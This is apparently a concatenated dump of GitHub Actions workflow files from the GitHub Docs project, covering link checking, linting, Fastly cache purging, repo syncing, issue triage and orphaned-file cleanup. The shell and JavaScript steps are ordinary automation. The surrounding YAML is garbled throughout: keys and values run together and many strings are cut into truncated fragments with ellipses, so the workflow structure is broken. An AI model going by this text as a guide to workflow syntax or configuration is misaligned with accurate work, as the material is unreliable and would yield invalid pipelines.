curl --retry-connrefused --retry 5 ${{ env.ELASTICSEARCH_URL }}/_cat/indices?v
curl --retry-connrefused --retry 5 ${{ env.ELASTICSEARCH_URL }}/_cat/indices?v
Purge Fastly edge cachePurge F ... e cacheFASTLY_TOKEN${{ secrets.FASTLY_TOKEN }}FASTLY_SERVICE_ID${{ secrets.FASTLY_SERVICE_ID }}${{ sec ... E_ID }}FASTLY_SURROGATE_KEYapi-search:${{ matrix.language }}api-sea ... uage }}FASTLY_ ... OKEN }}npm run purge-fastly-edge-cachenpm run ... e-cachename: P ... e cacheneeds:  ... tMatrixfigureOutMatrix:/home/huawei/github-actions-security/.github/workflows/github_docs__keep-caches-warm.ymlKeep caches warmkeep-caches-warm./.github/actions/warmup-remotejson-cache./.gith ... n-cacheuses: . ... n-cache./.github/actions/precompute-pageinfo./.gith ... ageinfouses: . ... ageinfokeep-caches-warm:name: K ... es warm/home/huawei/github-actions-security/.github/workflows/github_docs__link-check-daily.ymlLink Checker: Daily'Link C ...  Daily'check_all_english_linkscheck_a ... h_linksCheck all linksCheck that gh CLI is installedCheck t ... stalledgh --versionname: C ... stalledCheck out repo's default branchCheck o ...  branchFigure out which docs-early-access branch to checkout, if internal repoFigure  ... al repocheck-early-access${{ github.head_ref || github.ref_name }}BRANCH_ ... name }}npm run what-docs-early-access-branchnpm run ... -branchname: F ... al repoCheck out docs-early-access too, if internal repoCheck o ... al repogithub/docs-early-accessgithub/ ... -accessdocs-early-access${{ steps.check-early-access.outputs.branch }}reposit ... -accessname: C ... al repoMerge docs-early-access repo's foldersMerge d ... folderssrc/early-access/scripts/merge-early-access.shsrc/ear ... cess.shname: M ... foldersRestore disk-cache file for external link checkingRestore ... heckingexternal-link-checker-db.jsonexterna ... db.jsonexternal-link-checker-${{ hashFiles('src/links/scripts/rendered-content-link-checker.ts') }}externa ... ts') }}path: e ... db.jsonname: R ... heckingInsight into external link checker DB json file (before)Insight ... before)if [ -f external-link-checker-db.json ]; then
  echo "external-link-checker-db.json exists"
  echo -n "Number of URLs in cache: "
  jq '.urls | keys_unsorted' external-link-checker-db.json | wc -l
else
  echo "external-link-checker-db.json does not exist"
fi
name: I ... before)Run link checkerDISABLE_REWRITE_ASSET_URLSDISABLE ... ET_URLSLEVELcritical'critical'ACTION_RUN_URL${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}broken link reportCREATE_REPORTCHECK_EXTERNAL_LINKSPATIENTEXTERNAL_LINK_CHECKER_MAX_AGE_DAYSEXTERNA ... GE_DAYSEXTERNAL_SERVER_ERRORS_AS_WARNINGSEXTERNA ... ARNINGSFAIL_ON_FLAWDISABLE ... S: true120npm run rendered-content-link-checkernpm run ... checkerInsight into external link checker DB json file (after)Insight ... (after)name: I ... (after)- name: ... stalledname: C ... l linkscheck_a ... _links:name: ' ...  Daily'/home/huawei/github-actions-security/.github/workflows/github_docs__link-check-on-pr.ymlLink Checker: On PR'Link C ...  On PR'check-linksLink check all pages (internal links only)Link ch ... s only)SHOULD_COMMENT${{ secrets.DOCS_BOT_PAT_BASE != '' }}${{ sec ... = '' }}CHECK_ANCHORSLEVEL: 'critical'name: L ... s only)check-links:name: ' ...  On PR'/home/huawei/github-actions-security/.github/workflows/github_docs__lint-code.ymlLint codelint-codeRun lintername: Run linterRun Prettiernpm run prettier-checknpm run ... r-checkname: Run PrettierRun TypeScriptnpm run tscname: Run TypeScriptlint-code:name: Lint code/home/huawei/github-actions-security/.github/workflows/github_docs__lint-entire-content-data-markdown.ymlLint entire content and data markdown files'Lint e ...  files'20 16 * * 0'20 16 * * 0'cron: ' ...  Sunday- cron: ...  Sundaylint-entire-content-datalint-en ... nt-dataLint entire content and data directoriesLint en ... ctoriesRun content linterlinting-content-datanpm run lint-content -- --errors-only --paths content data --output-file /tmp/error-lints.jsonnpm run ... ts.jsonname: R ...  linterOpen issue in docs-contentOpen is ... content${{ always() && steps.linting-content-data.outcome == 'failure' }}${{ alw ... ure' }}broken content markdown reportbroken  ...  reportnpm run post-lints -- --path /tmp/error-lints.jsonname: O ... contentname: L ... ctorieslint-en ... t-data:name: ' ...  files'/home/huawei/github-actions-security/.github/workflows/github_docs__local-dev.ymlLocal developmentmerge_group:local-devDisable Next.js telemetryDisable ... lemetrynpx next telemetry disablenpx nex ... disablename: D ... lemetryPLAYWRIGHT_START_SERVER_COMMANDPLAYWRI ... COMMANDnpm start'npm start'PLAYWRIGHT_RETRIESTEST_EARLY_ACCESSPLAYWRI ...  start'npm run playwright-test -- playwright-local-devnpm run ... cal-devnpm start > /tmp/stdout.log 2> /tmp/stderr.log &npm sta ... r.log &View the home pageecho "Going to sleep a little to wait for the server to start"
sleep 10
curl --fail --retry-connrefused --retry 5 http://localhost:4000/
name: V ... me pageRun basic testsnpm run test-local-devname: R ... c testsPre-commit hooks should prevent bad Markdown editsPre-com ... n editsset -e

# This test assumes this one file always exists
ls content/get-started/start-your-journey/hello-world.md

# Not sure if it matters but we're in a detached HEAD state
# after the actions/checkout action.
git checkout -b my-new-branch
# Also, do this so you don't get errors from git about this
# not being set up before your first commit attempt
git config user.name github-actions
git config user.email github-actions@github.com

# To know what will fail the markdown lint, see src/content-linter/style/github-docs.js
# Add some NOT valid Markdown to it
# In this case an internal link with a hardcode /en/ prefix.
echo "This *is** not valid [Markdown](/en/foo)" >> content/get-started/start-your-journey/hello-world.md
git commit -a -m "this should fail"
exit_code=$?
if [ $exit_code != 0 ]; then
  echo "That SHOULD have failed, but it DIDN'T"
  exit 1
else
  echo "As expected, it failed :)"
fi
name: P ... n editslocal-dev:name: L ... lopment/home/huawei/github-actions-security/.github/workflows/github_docs__merged-notification.ymlMerged notification'closed'- 'closed'github.repository == 'github/docs' && github.event.pull_request.merged && github.event.pull_request.base.ref == github.event.repository.default_branch && github.event.pull_request.user.login != 'docs-bot'github.rest.issues.createComment({
  ...context.repo,
  issue_number: context.payload.pull_request.number,
  body: "Thanks very much for contributing! Your pull request has been merged ðŸŽ‰ You should see your changes appear on the site in approximately 24 hours. If you're looking for your next contribution, check out our [help wanted issues](https://github.com/github/docs/issues?q=is%3Aopen+is%3Aissue+label%3A%22help+wanted%22) :zap:"
})
name: M ... ication/home/huawei/github-actions-security/.github/workflows/github_docs__moda-allowed-ips.ymlUpdate Moda allowed IPsUpdate  ... wed IPs20 16 * * 4'20 16 * * 4'update-moda-allowed-ipsupdate- ... wed-ipsCheck out the repositoryCheck o ... ositoryUpdate list of allowed IPsecho "Getting a list of Fastly IP addresses...."
ips=$( \
  curl -s https://api.fastly.com/public-ip-list \
  | jq -r '.addresses | join(",")' \
)
echo "Got a list of Fastly IP addresses: $ips"

echo "Updating the list of allowed IPs in Moda config..."
yq -i ".metadata.annotations[\"moda.github.net/allowed-ips\"] = \"$ips\"" \
  config/kubernetes/production/services/webapp.yaml
echo "Updated the list of allowed IPs in Moda config"

echo "Checking if there is a change to make..."
if git diff --quiet; then
  echo "No changes to the allowed IPs"
  exit 0
fi

echo "Change found; making a pull request..."
branchname=update-allowed-ips-$(date +%s)
git checkout -b $branchname
git commit -am "Update list of allowed IPs"
git push
gh pr create \
  --title "Update list of allowed IPs" \
  --body 'This PR updates the list of allowed IPs in Moda. It is automatically generated.' \
  --head=$branchname
echo "Pull request created"
name: U ... wed IPsupdate- ... ed-ips:/home/huawei/github-actions-security/.github/workflows/github_docs__moda-ci.yamldocs-internal Moda CIdocs-in ... Moda CIgh-readonly-queue/**'gh-rea ... eue/**'- 'gh-r ... eue/**'checks_requested[checks_requested]types:  ... uested]set-vault-keysmodified_vault_keys${{ steps.modify_vault_keys.outputs.modified }}${{ ste ... fied }}modifie ... fied }}Set vault-keys outputSet vau ...  outputmodify_vault_keysif [ -z "${{ vars.VAULT_KEYS }}" ]; then
  # We want to add the DOCS_BOT_PAT_BASE to the list of keys
  # so that builds fetch the secret from the docs-internal vault
  # where --environment is "ci"
  echo "modified=DOCS_BOT_PAT_BASE" >> $GITHUB_OUTPUT
else
  echo "modified=${{ vars.VAULT_KEYS }},DOCS_BOT_PAT_BASE" >> $GITHUB_OUTPUT
fi
name: S ...  output- name: ...  outputmoda-config-bundle${{ matrix.ci_job.job }}${{ mat ... .job }}ci_job'job'docs-internal-moda-config-bundle'docs-i ... bundle'{ 'job' ... ndle' }[{ 'job ... dle' }]ci_job: ... dle' }]github/internal-actions/.github/workflows/moda.yml@maingithub/ ... ml@mainci-formatted-job-nameci-form ... ob-namevault-keys${{ needs.set-vault-keys.outputs.modified_vault_keys }}${{ nee ... keys }}ci-form ... .job }}dx-bot-token${{ secrets.INTERNAL_ACTIONS_DX_BOT_ACCOUNT_TOKEN }}datadog-api-key${{ secrets.DATADOG_API_KEY }}dx-bot- ... OKEN }}docker-imagedocs-internal-docker-image'docs-i ... -image'{ 'job' ... mage' }[{ 'job ... age' }]ci_job: ... age' }]github/internal-actions/.github/workflows/kube.yml@mainattestdocker-build-env-secretsdocker- ... secretsDOCS_BOT_PAT_BASE'DOCS_BOT_PAT_BASE'docker-securitydocs-internal-docker-security'docs-i ... curity'{ 'job' ... rity' }[{ 'job ... ity' }]ci_job: ... ity' }]github/internal-actions/.github/workflows/docker_security.yml@mainset-vault-keys:checksname: d ... Moda CI/home/huawei/github-actions-security/.github/workflows/github_docs__move-content.ymlMove content script testMove co ... pt testsrc/content-render/scripts/move-content.jssrc/con ... tent.jssrc/content-render/scripts/test-move-content.tssrc/con ... tent.tssrc/frame/lib/**/*.js'src/fr ... */*.js'.github/workflows/move-content.yml.github ... ent.ymlsrc/fixtures/fixtures/content/get-started/src/fix ... tarted/src/fixtures/fixtures/content/code-security/src/fix ... curity/- src/c ... tent.jsmove-content-testSet up a dummy git userSet up  ... it user# These must be set to something before running the move-content
# script because it depends on executing `git mv ...`
# and `git commit ...`
git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"
name: S ... it userMove hello-world.md to hello-wurld.mdMove he ... urld.mdROOTsrc/fixtures/fixturessrc/fix ... ixturesROOT: s ... ixturesnpm run move-content -- \
  src/fixtures/fixtures/content/get-started/start-your-journey/hello-world.md \
  src/fixtures/fixtures/content/get-started/start-your-journey/hello-wurld.md

npm run test-moved-content -- \
  src/fixtures/fixtures/content/get-started/start-your-journey/hello-world.md \
  src/fixtures/fixtures/content/get-started/start-your-journey/hello-wurld.md

# TODO: Add tests that inspects the git log
git log | head -n 100
name: M ... urld.mdMove code-security/getting-started to code-security/got-startedMove co ... startednpm run move-content -- \
  src/fixtures/fixtures/content/code-security/getting-started \
  src/fixtures/fixtures/content/code-security/got-started

npm run test-moved-content -- \
  src/fixtures/fixtures/content/code-security/getting-started \
  src/fixtures/fixtures/content/code-security/got-started

# TODO: Add tests that inspects the git log
git log | head -n 100
name: M ... startedmove-content-test:name: M ... pt test/home/huawei/github-actions-security/.github/workflows/github_docs__move-existing-issues-to-the-correct-repo.ymlMove existing issues to correct docs repoMove ex ... cs repotransfer_issuesmove_to_correct_repoTEAM_ENGINEERING_REPOTEAM_EN ... NG_REPO${{ secrets.TEAM_ENGINEERING_REPO }}TEAM_EN ... REPO }}const owner = 'github'
const originalRepo = 'docs-internal'
let correctRepo = process.env.TEAM_ENGINEERING_REPO

const correctRepoObject = await github.rest.repos.get({
  owner: owner,
  repo: correctRepo
})

const allIssues = await github.paginate(github.rest.issues.listForRepo, {
  owner: owner,
  repo: originalRepo,
  per_page: 100,
  labels: ['engineering']
})

for (const issue of allIssues) {
  // Extra redundancy with this additional check to be safe
  if (issue.labels.find(label => label.name === 'engineering')) {
    // Transfer the issue to the correct repo
    const issueNodeId = issue.node_id
    const correctRepositoryNodeId = correctRepoObject.data.node_id
    console.log(`Issue GraphQL Node ID: ${issueNodeId}`)
    console.log(`Repository GraphQL Node ID: ${correctRepositoryNodeId}`)

    const mutation = `mutation ($id: ID!, $repositoryId: ID!) {
      transferIssue(input: {
        issueId: $id,
        repositoryId: $repositoryId
      }) {
        issue {
          url,
          number
        }
      }
    }`

    const variables = {
      id: issueNodeId,
      repositoryId: correctRepositoryNodeId
    }

    const graph = await github.graphql(mutation, variables)
    console.log('GraphQL mutation result:\n' + JSON.stringify(graph))

    // Add the same labels to the new issue
    const newIssueNumber = graph.transferIssue.issue.number
    await github.rest.issues.addLabels({
      owner: owner,
      repo: correctRepo,
      issue_number: newIssueNumber,
      labels: issue.labels.map(label => label.name),
    })
  }
}
id: mov ... ct_repo- id: m ... ct_repotransfer_issues:name: M ... cs repo/home/huawei/github-actions-security/.github/workflows/github_docs__move-help-wanted-issues.ymlMove help wanted issuesMove he ...  issuesmove_issues${{
  github.repository == 'github/docs' &&
  (github.event.label.name == 'help wanted' || github.event.label.name == 'good first issue')
}}alex-page/github-project-automation-plus@303f24a24c67ce7adf565a07e96720faf126fe36alex-pa ... 126fe36projectDocs open source boardDocs op ... e boardcolumnHelp wantedproject ... e boarduses: a ... 126fe36- uses: ... 126fe36move_issues:name: M ...  issues/home/huawei/github-actions-security/.github/workflows/github_docs__move-ready-to-merge-pr.yamlMove and unlabel ready to merge PRsMove an ... rge PRsunmark_for_review${{
  github.repository == 'github/docs' &&
  github.event.label.name == 'ready to merge'
}}move PRTriagename: move PRremove label./.github/actions/labeler./.gith ... labelerignoreifAssignedremoveLabelswaiting for review'waiting for review'ignorei ... 'false'name: remove label- name: move PRunmark_for_review:name: M ... rge PRs/home/huawei/github-actions-security/.github/workflows/github_docs__move-reopened-issues-to-triage.yamlMove Reopened Issues to TriageMove Re ...  Triagemove-reopened-issue-to-triagemove-re ... -triageconst issueNumber = context.issue.number;
const doneColumnId = 11167427;
const triageColumnId = 11007039;

try {
  const cards = await github.rest.projects.listCards({
    column_id: doneColumnId
  });

  for (const card of cards) {
    if (card.content_url.endsWith(`/${issueNumber}`)) {
      await github.rest.projects.moveCard({
        card_id: card.id,
        position: 'position',
        column_id: triageColumnId
      });
    }
  }
} catch(e) {
  console.log(e);
}
move-re ... triage:name: M ...  Triage/home/huawei/github-actions-security/.github/workflows/github_docs__needs-sme-stale-check.yamlStale check for issues or PRs with "needs SME" labelStale c ... " labelstale_needs-sme${{ github.repository == 'github/docs' }}${{ git ... ocs' }}actions/stale@28ca1036281a5e5922ead5184a1bbf96e5fc984eactions ... 5fc984eonly-labelsneeds SME28This is a gentle bump for the docs team that this issue is waiting for technical review.'This i ... eview.'SME staleThis is a gentle bump for the docs team that this PR is waiting for technical review.only-la ... eds SMEuses: a ...  v9.0.0- uses: ...  v9.0.0if: ${{ ... ocs' }}stale_needs-sme:name: S ... " label/home/huawei/github-actions-security/.github/workflows/github_docs__needs-sme-workflow.ymlComment on adding "needs SME" labelComment ... " labeladd-issue-comment${{ github.repository == 'github/docs' && (github.event.label.name == 'needs SME' && github.event_name == 'issues') }}${{ git ... es') }}Thanks for opening an issue! We've triaged this issue for technical review by a subject matter expert :eyes:
if: ${{ ... es') }}add-pr-comment${{ github.repository == 'github/docs' && (github.event.label.name == 'needs SME' && github.event_name == 'pull_request_target') }}${{ git ... et') }}Thanks for opening a pull request! We've triaged this issue for technical review by a subject matter expert :eyes:
if: ${{ ... et') }}add-issue-comment:name: C ... " label/home/huawei/github-actions-security/.github/workflows/github_docs__no-response.yamlNo Response[created]types: [created]20 * * * *'20 * * * *'cron: ' ... es past- cron: ... es pastnoResponsemore-information-needed'more-i ... needed'This issue has been automatically closed because there has been no response to our request for more information from the original author. With only the information that is currently in the issue, we don't have enough information to take action. Please reach out if you have or find the answers we need so that we can investigate further. See [this blog post on bug reports and the importance of repro steps](https://www.lee-dohm.com/2015/01/04/writing-good-bug-reports/) for more information about the kind of information that may be helpful.
This PR has been automatically closed because there has been no response to to our request for more information from the original author. Please reach out if you have the information we requested, or open a [new issue](https://github.com/github/docs/issues/new/choose) to describe your changes. Then we can begin the review process.
noResponse:name: No Response/home/huawei/github-actions-security/.github/workflows/github_docs__notify-about-deployment.ymlNotify about production deploymentNotify  ... loymentfind-pr-and-post-commentfind-pr ... comment${{
  github.repository == 'github/docs-internal' &&
  (github.event_name != 'workflow_run' ||
  github.event.workflow_run.conclusion == 'success')
}}Sleep a little to give Fastly Purge a chanceSleep a ...  chancesleep 30name: S ...  chanceFind last PRget-numbernpm run find-past-built-prnpm run ... uilt-prname: Find last PRFind content directory changes commentFind co ... comment${{ steps.get-number.outputs.number != '' }}${{ steps.get-number.outputs.number }}<!-- GONE_TO_PRODUCTION -->'<!-- G ... ON -->'<!-- GONE_TO_PRODUCTION -->
ðŸš€ **This pull request has gone into production!**

The SHA of https://docs.github.com/_build matches the merge commit in this PR.

If you don't see updates when expected, try adding a random query string to the URL like `?bla=1234` and see if that helps.
If that shows the expected content, it would indicate that the CDN is "overly caching" the page still. It will eventually update, but it can take a while.
find-pr ... omment:name: N ... loyment/home/huawei/github-actions-security/.github/workflows/github_docs__notify-when-maintainers-cannot-edit.yamlNotify When Maintainers Cannot EditNotify  ... ot Editnotify-when-maintainers-cannot-editnotify- ... ot-editconst query = `
  query($number: Int!) {
    repository(owner: "github", name: "docs") {
      pullRequest(number: $number) {
        headRepositoryOwner {
          login
        }
        maintainerCanModify
      }
    }
  }
`;

const pullNumber = context.issue.number;
const variables = { number: pullNumber };

try {
  console.log(`Check github/docs#${pullNumber} for maintainer edit access ...`);
  const result = await github.graphql(query, variables);

  console.log(JSON.stringify(result, null, 2));

  const pullRequest = result.repository.pullRequest;

  if (pullRequest.headRepositoryOwner.login === 'github') {
    console.log('PR owned by github');
    return;
  }

  if (!pullRequest.maintainerCanModify) {
    console.log('PR not owned by github and does not have maintainer edits enabled');

    await github.rest.issues.createComment({
      issue_number: pullNumber,
      owner: 'github',
      repo: 'docs',
      body: "Thanks for submitting a PR to the GitHub Docs project!\n\nIn order to review and merge PRs most efficiently, we require that all PRs grant maintainer edit access before we review them. For information on how to do this, [see the documentation](https://docs.github.com/en/github/collaborating-with-pull-requests/working-with-forks/allowing-changes-to-a-pull-request-branch-created-from-a-fork)."
    });
  }
} catch(e) {
  console.log(e);
}
notify- ... t-edit:name: N ... ot Edit/home/huawei/github-actions-security/.github/workflows/github_docs__orphaned-features-check.ymlOrphaned features check'Orphan ...  check'.github/workflows/orphaned-features-check.yml.github ... eck.ymlsrc/data-directory/scripts/find-orphaned-features/**'src/da ... res/**'- .gith ... eck.ymlorphaned-features-checkorphane ... s-checkCheck for orphaned featuresCheck f ... eaturesset -e

npm run find-orphaned-features -- find --verbose --output /tmp/orphaned-features.json

if [ -f /tmp/orphaned-features.json ]; then
  echo "Orphaned features found:"
  cat /tmp/orphaned-features.json
else
  echo "No orphaned features found"
  exit 0
fi

npm run find-orphaned-features -- delete --verbose /tmp/orphaned-features.json

git status

# When run on a pull_request, we're just testing the tooling.
# Exit before it actually pushes the possible changes.
if [ "$DRY_RUN" = "true" ]; then
  echo "Dry-run mode when run in a pull request"
  exit 0
fi

# Replicated from the translation pipeline PR-maker Action
git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"

date=$(date '+%Y-%m-%d-%H-%M')
branchname=orphaned-features-$date-$GITHUB_RUN_ID

git checkout -b $branchname
git commit -a -m "Delete orphaned features $date"
git push origin $branchname

body=$(cat <<-EOM
  Found with the 'npm run find-orphaned-features' script.
  The orphaned features workflow file .github/workflows/orphaned-features-check.yml
  runs every Monday at 16:20 UTC / 8:20 PST.
  The first responder should just spot-check some of the orphans
  to make sure they aren't referenced anywhere
  and then approve and merge the pull request.
  For more information, see [Doc: Orphaned Features](https://github.com/github/docs-engineering/blob/main/docs/orphaned-features.md).
EOM
)

gh pr create \
  --title "Delete orphaned features ($date)" \
  --body "$body" \
  --repo github/docs-internal \
  --label docs-content-fr
name: C ... eaturesorphane ... -check:name: ' ...  check'/home/huawei/github-actions-security/.github/workflows/github_docs__orphaned-files-check.ymlOrphaned files check.github/workflows/orphaned-assets-check.yml.github/workflows/orphaned-files-check.ymlsrc/assets/scripts/find-orphaned-assets.jssrc/ass ... sets.jssrc/content-render/scripts/reusables-cli/find/unused.tssrc/con ... used.tssrc/workflows/walk-files.tssrc/wor ... iles.tssrc/languages/lib/languages.jssrc/lan ... ages.jsorphaned-files-checkCheck for orphaned assets and reusablesCheck f ... usablesset -e

# The `-s` is to make npm run silent and not print verbose
# information about the npm script alias.
assetFilesToRemove=$(npm run -s find-orphaned-assets)
reusableFilesToRemove=$(npm run -s reusables -- find unused | grep '^data/reusables' || true)
[ -z "$assetFilesToRemove" ] && [ -z "$reusableFilesToRemove" ] && exit 0

if [ -n "$assetFilesToRemove" ]; then
  echo $assetFilesToRemove | xargs git rm
fi
if [ -n "$reusableFilesToRemove" ]; then
  echo $reusableFilesToRemove | xargs git rm
fi

git status

# If nothing to commit, exit now. It's fine. No orphans.
git status -- ':!translations*' | grep 'nothing to commit' && exit 0

# When run on a pull_request, we're just testing the tooling.
# Exit before it actually pushes the possible changes.
if [ "$DRY_RUN" = "true" ]; then
  echo "Dry-run mode when run in a pull request"
  exit 0
fi

# Replicated from the translation pipeline PR-maker Action
git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"

date=$(date '+%Y-%m-%d-%H-%M')
branchname=orphaned-files-$date-$GITHUB_RUN_ID

git checkout -b $branchname
git commit -m "Delete orphaned files $date"
git push origin $branchname

body=$(cat <<-EOM
  Found with the `npm run find-orphaned-assets` and `npm run -s reusables -- find unused` scripts.

  The orphaned files workflow file .github/workflows/orphaned-files-check.yml runs every Monday at 16:20 UTC / 8:20 PST.

  If you are the first responder, please spot check some of the unused assets to make sure they aren't referenced anywhere. Then, approve and merge the pull request.

  For more information, see [Doc: Orphaned Assets](https://github.com/github/docs-engineering/blob/main/docs/orphaned-assets.md) and [Doc: Reusables CLI](https://github.com/github/docs-internal/tree/main/src/content-render/scripts/reusables-cli).
EOM
)

gh pr create \
  --title "Delete orphaned files ($date)" \
  --body "$body" \
  --repo github/docs-internal \
  --label docs-content-fr
name: C ... usables/home/huawei/github-actions-security/.github/workflows/github_docs__os-ready-for-review.ymlOS Ready for reviewrequest_doc_reviewRequest a review from the docs-content teamRequest ... nt teamgithub.event.label.name == 'waiting for review' && github.repository == 'github/docs'Run scriptnpm run ready-for-docs-review
ITEM_NODE_ID${{ github.event.pull_request.node_id || github.event.issue.node_id }}${{ git ... e_id }}AUTHOR_LOGIN${{ github.event.pull_request.user.login || github.event.issue.user.login }}name: Run scriptname: R ... nt teamrequest_doc_review:name: O ...  review/home/huawei/github-actions-security/.github/workflows/github_docs__package-lock-lint.ymlPackage lock lint.github/workflows/package-lock-lint.yml.github ... int.yml- package.jsonRun checknpm --version

# From https://docs.npmjs.com/cli/v7/commands/npm-install
#
#   The --package-lock-only argument will only update the
#   package-lock.json, instead of checking node_modules and
#   downloading dependencies.
#
npm install --package-lock-only --ignore-scripts --include=optional

# If the package.json (dependencies and devDependencies) is
# in correct sync with package-lock.json running the above command
# should *not* make an edit to the package-lock.json. I.e.
# running `git status` should
# say "nothing to commit, working tree clean".
git diff --exit-code
name: Run checkname: P ... ck lint/home/huawei/github-actions-security/.github/workflows/github_docs__purge-fastly.ymldeployment_statusComma separated languages. E.g. 'en,es,ja,pt,zh,ru,fr,ko,de' (defaults to en)"Comma  ... to en)"'en'descrip ... to en)"languages:deployment_status:send-purges${{
  github.repository == 'github/docs-internal' &&
  (github.event_name != 'deployment_status' ||
   github.event.deployment_status.state == 'success' && github.event.deployment_status.environment == 'production')
}}Wait for production to match build numberWait fo ...  numberneeds=$(git rev-parse HEAD)
start_time=$(date +%s)
timeout_seconds=1200
while [[ $needs != $(curl -s --fail --retry-connrefused --retry 5 https://docs.github.com/_build) ]]
do
  if [[ $(($(date +%s) - $start_time)) -gt $timeout_seconds ]]
  then
    echo "Production did not match the build number within $timeout_seconds seconds"
    exit 1
  fi
  echo "Production is not up to date with the build commit"
  sleep 10
done
echo "Production is up to date with the build commit"
name: W ...  numberPurge Fastly edge cache per languagePurge F ... anguageLANGUAGES${{ inputs.languages || 'en' }}${{ inp ... 'en' }}LANGUAG ... for allnpm run purge-fastly-edge-cache-per-languagenpm run ... anguagesend-purges:name: Purge Fastly/home/huawei/github-actions-security/.github/workflows/github_docs__purge-old-workflow-runs.ymlPurge old workflow runsPurge o ... ow runspurge-old-workflow-runspurge-o ... ow-runs${{ github.repository == 'github/docs-internal' || github.repository == 'github/docs' }}Checkout out reponame: C ... ut repoRun purge scriptnpm run purge-old-workflow-runsnpm run ... ow-runspurge-o ... w-runs:name: P ... ow runs/home/huawei/github-actions-security/.github/workflows/github_docs__ready-for-doc-review.ymlReady for docs-content reviewReady f ...  reviewreview_requested[labele ... uested]github.repository_owner == 'github' && github.repository != 'github/docs' && (github.event.label.name == 'ready-for-doc-review' || github.event.requested_team.name == 'docs-content' || github.event.requested_team.name == 'docs-reviewers')github/docs-internalreposit ... nternalSet AUTHOR_LOGINif [[ "${{ github.event.pull_request.assignee.login && github.event.pull_request.user.login == 'docs-bot' }}" ]]; then
  echo "AUTHOR_LOGIN=${{ github.event.pull_request.assignee.login }}" >> $GITHUB_ENV
else
  echo "AUTHOR_LOGIN=${{ github.event.pull_request.user.login }}" >> $GITHUB_ENV
fi
name: S ... R_LOGIN${{ github.event.pull_request.node_id }}${{ github.event.pull_request.base.repo.full_name }}name: R ...  review/home/huawei/github-actions-security/.github/workflows/github_docs__remove-fr-label-remove-from-fr-v2.ymlRemove PRs from FR project v2 when FR label is removedRemove  ... removedPR Number'PR Number'descrip ... Number'PR_NUMBER:label-removedRemove from FR v2 projectRemove  ... project(github.event.label.name == 'docs-content-fr')
&& (github.repository == 'github/docs-internal')
Remove issue from FR v2 project${{ github.event.pull_request.number || inputs.PR_NUMBER }}${{ git ... MBER }}echo "Finding item in project..."

ITEM_ID=$(gh project item-list $PROJECT_NUMBER --owner github --limit 100 --format json | jq ".items[] | select(.content.number == $PR_NUMBER).id")

if [ -n "$ITEM_ID" ]; then
  echo "Archiving item $ITEM_ID ..."
  gh project item-archive $PROJECT_NUMBER --owner github --id $ITEM_ID
else
  echo "Pull request number $PR_NUMBER not found on FR v2 Project"
fi

echo "done"
name: R ... project- name: ... projectlabel-removed:name: R ... removed/home/huawei/github-actions-security/.github/workflows/github_docs__repo-sync.ymlRepo Sync20 */3 * * *'20 */3 * * *'repo-syncSync repo to branchrepo-sync/github-sync@3832fe8e2be32372e1b3970bbae8e7079edeec88repo-sy ... edeec88source_repohttps://${{ secrets.DOCS_BOT_PAT_BASE }}@github.com/github/${{ github.repository == 'github/docs-internal' && 'docs' || 'docs-internal' }}.githttps:/ ...  }}.gitsource_branchdestination_branchgithub_tokensource_ ...  }}.gitname: S ...  branchShip pull requestconst { owner, repo } = context.repo
const head = 'github:repo-sync'
const base = 'main'

async function closePullRequest(prNumber) {
  console.log('Closing pull request', prNumber)
  await github.rest.pulls.update({
    owner,
    repo,
    pull_number: prNumber,
    state: 'closed'
  })
  // Error loud here, so no try/catch
  console.log('Closed pull request', prNumber)
}

console.log('Closing any existing pull requests')
const { data: existingPulls } = await github.rest.pulls.list({ owner, repo, head, base })
if (existingPulls.length) {
  console.log('Found existing pull requests', existingPulls.map(pull => pull.number))
  for (const pull of existingPulls) {
    await closePullRequest(pull.number)
  }
  console.log('Closed existing pull requests')
}

try {
  const { data } = await github.rest.repos.compareCommits({
    owner,
    repo,
    head,
    base,
  })
  const { files } = data
  console.log(`File changes between ${head} and ${base}:`, files)
  if (!files.length) {
    console.log('No files changed, bailing')
    return
  }
} catch (err) {
  console.error(`Unable to compute the files difference between ${head} and ${base}`, err.message)
}

console.log('Creating a new pull request')
const body = `
This is an automated pull request to sync changes between the public and private repos.
Our bot will merge this pull request automatically.
To preserve continuity across repos, _do not squash_ this pull request.
`
let pull, pull_number
try {
  const response = await github.rest.pulls.create({
    owner,
    repo,
    head,
    base,
    title: 'Repo sync',
    body,
  })
  pull = response.data
  pull_number = pull.number
  console.log('Created pull request successfully', pull.html_url)
} catch (err) {
  // Don't error/alert if there's no commits to sync
  // Don't throw if > 100 pulls with same head_sha issue
  if (err.message?.includes('No commits') || err.message?.includes('same head_sha')) {
    console.log(err.message)
    return
  }
  throw err
}

console.log('Locking conversations to prevent spam')
try {
  await github.rest.issues.lock({
    ...context.repo,
    issue_number: pull_number,
    lock_reason: 'spam'
  })
  console.log('Locked the pull request to prevent spam')
} catch (error) {
  console.error('Failed to lock the pull request.', error)
  // Don't fail the workflow
}

console.log('Counting files changed')
const { data: prFiles } = await github.rest.pulls.listFiles({ owner, repo, pull_number })
if (prFiles.length) {
  console.log(prFiles.length, 'files have changed')
} else {
  console.log('No files changed, closing')
  await closePullRequest(pull_number)
  return
}

console.log('Checking for merge conflicts')
if (pull.mergeable_state === 'dirty') {
  console.log('Pull request has a conflict', pull.html_url)
  await closePullRequest(pull_number)
  throw new Error('Pull request has a conflict, please resolve manually')
}
console.log('No detected merge conflicts')

console.log('Merging the pull request')
// Admin merge pull request to avoid squash
await github.rest.pulls.merge({
  owner,
  repo,
  pull_number,
  merge_method: 'merge',
})
// Error loud here, so no try/catch
console.log('Merged the pull request successfully')
name: S ... requestrepo-sync:name: Repo Sync/home/huawei/github-actions-security/.github/workflows/github_docs__review-comment.ymlReview comment.github/workflows/review-comment.yml'.githu ... nt.yml'- '.git ... nt.yml'${{ github.workflow }} @ ${{ github.event.pull_request.head.label || github.head_ref || github.ref }} x ${{ github.event_name }}review-comment${{ github.event.pull_request.user.login != 'docs-bot' && (github.repository == 'github/docs-internal' || github.repository == 'github/docs') }}${{ git ... cs') }}check out repo contentcheck o ... contentname: c ... contentSet APP_URLif [[ "${{ github.repository }}" == "github/docs-internal" ]]; then
  echo "APP_URL=https://docs-internal-staging-TREE.githubapp.com/en" >> $GITHUB_ENV
